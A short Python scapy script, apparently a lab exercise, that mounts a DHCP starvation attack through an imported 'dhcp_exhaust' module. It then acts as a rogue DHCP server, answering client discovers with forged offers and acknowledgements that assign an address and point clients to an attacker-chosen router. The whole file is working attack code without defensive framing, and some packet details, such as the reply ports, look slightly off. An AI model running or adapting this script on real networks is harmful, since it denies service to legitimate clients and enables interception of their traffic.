#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP
import dhcp_exhaust
source_interface = "Ethernet"

# EXHAUST IP POOL OF REAL DHCP
dhcp_exhaust.exhaust()
print("exhaust finished SNIFFING")

def process(p):
    if p.haslayer('DHCP'):
        if p["DHCP"].options[0][1] == 1:
            chaddr = p["BOOTP"].chaddr
            mac = p["Ether"].src
            xid = p["BOOTP"].xid
            dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src='10.10.1.1', dst='255.255.255.255') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr="10.10.1.2", siaddr="10.10.1.1", chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'offer'),("server_id", "10.10.1.1"), ("broadcast_address", "10.10.1.255"),\
                        ("router", "10.10.1.254"), ("subnet_mask", "255.255.255.0"), ('end')])
            sendp(dhcp_offer, iface=source_interface)
            request = sniff(filter="port 68 and port 67", iface=source_interface, count=1)
            dhcp_ack = Ether(dst=mac) \
                        / IP(src='10.10.1.1', dst='10.10.1.2') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr="10.10.1.2", siaddr="10.10.1.1", chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'ack'),("server_id", "10.10.1.1"), ("broadcast_address", "10.10.1.255"),\
                        ("router", "10.10.1.254"), ("subnet_mask", "255.255.255.0"), ('end')])
            sendp(dhcp_ack, iface=source_interface)


# DHCP SERVEUR SIMULATION
offer = sniff(filter="port 68 and port 67", iface=source_interface, prn=process)